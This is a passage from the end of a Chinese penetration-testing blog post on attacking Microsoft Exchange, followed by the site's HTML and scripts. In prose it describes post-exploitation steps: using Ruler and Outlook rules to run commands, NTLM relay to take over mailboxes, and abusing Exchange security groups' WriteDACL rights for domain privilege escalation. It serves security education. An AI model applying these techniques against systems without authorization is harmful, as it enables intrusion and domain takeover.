+<h2 id="0x05-后渗透"><a href="#0x05-后渗透" class="headerlink" title="0x05 后渗透"></a>0x05 后渗透</h2><p>在获取一个用户的账号密码之后，如何进入内网？这里有一个神器<strong><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a></strong>,在Outlook中有一个Rules and Alerts的功能，利用此功能，可执行一些特定的如执行命令等操作，关于ruler的具体使用，可以参考相关文章，另外在内网中，如何去发现Exchange服务器，如何使用NTLM中继来接管某用户邮箱的权限，这些内容在<a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">《深入Exchange Server在网络渗透下的利用方法》</a>中有了很详细的讲解，在这里就不多做阐述。</p>
+<p>另外需要补充一点可能有用的东西，Exchange安装以后会创建一个<code>Organization Management</code> 安全组：</p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010940263.jpg" alt="-w650"></p>
+<p>该组内的成员除了访问Exchagne设置外，可以修改其他Exchagne安全组的成员身份，如<code>Exchange Trusted Subsystem</code>,此组为<code>Exchange Windows Permissions</code>的成员</p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993399.jpg" alt="-w477"></p>
+<p>默认情况下，<code>Exchange Windows Permissions</code>安全组对安装Exchange的域的域对象具有writeDACL权限,这就意味着，我们可以进行权限的提升，详细的文章可以参考<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">《Escalating privileges with ACLs in Active Directory》</a>。</p>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文记录了我自己对Exchange在渗透中的利用的一些方式的总结，欢迎补充，更详细的内容可以查看参考的文章。</p>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><ol>
+<li><a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0</a></li>
+<li><a href="https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/</a></li>
+<li><a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/</a></li>
+<li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------本文结束，感谢阅读------</div>
+    
+</div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Evi1cg</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://evi1cg.github.io/archives/Exchange_Hack.html" title="Exchange在渗透测试中的利用">https://evi1cg.github.io/archives/Exchange_Hack.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Exchange/" rel="tag"># Exchange</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/Email_spoofing.html" rel="next" title="Something about email spoofing">
+                <i class="fa fa-chevron-left"></i> Something about email spoofing
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/CVE_2018_8581.html" rel="prev" title="Exchange用户伪造(CVE-2018-8581)">
+                Exchange用户伪造(CVE-2018-8581) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+
+      
+      
+    </footer>
+
+  
+    <br>
+    <div style="text-align:center" class="addthis_inline_share_toolbox">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5c40967aab5e187f"></script>
+    </div>
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+            
+            <a href="/">
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif" alt="Evi1cg">
+            
+            </a>
+              <p class="site-author-name" itemprop="name">Evi1cg</p>
+              <p class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archive">
+                
+                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">51</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zuotonghk@gmail.com" title="Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("09/17/2015 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Exchange简介"><span class="nav-number">1.</span> <span class="nav-text">0x00 Exchange简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Exchange-Endpoint"><span class="nav-number">2.</span> <span class="nav-text">0x01  Exchange Endpoint</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Get-UserList"><span class="nav-number">3.</span> <span class="nav-text">0x02 Get UserList</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证Exchange"><span class="nav-number">3.1.</span> <span class="nav-text">验证Exchange</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取用户列表"><span class="nav-number">3.2.</span> <span class="nav-text">获取用户列表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Brute-Force"><span class="nav-number">4.</span> <span class="nav-text">0x03 Brute Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Search-mail"><span class="nav-number">5.</span> <span class="nav-text">0x04 Search mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-后渗透"><span class="nav-number">6.</span> <span class="nav-text">0x05 后渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-总结"><span class="nav-number">7.</span> <span class="nav-text">0x06 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-参考"><span class="nav-number">8.</span> <span class="nav-text">0x07 参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+    <div style="display: none;"><a href="https://www.whoxy.com/"><img src="//whoxy.s3.amazonaws.com/x.png" alt="whois api"></a></div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Evi1cg</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery@2/dist/jquery.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script>
+
+
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 's1f976yBJAt2jkwXyp1klYGM-gzGzoHsz',
+    appKey: 'aQhe3medX27hXiDgPHMCjzMB',
+    placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+    avatar: '',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false
+  });
+   //新增以下代码即可，可以移除.info下所有子节点。
+  var infoEle = document.querySelector('#comments .info');
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+  infoEle.childNodes.forEach(function(item) {
+    item.parentNode.removeChild(item);
+  });}
+</script>
+
+
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+      }
+      else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function(i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function(e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function() {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
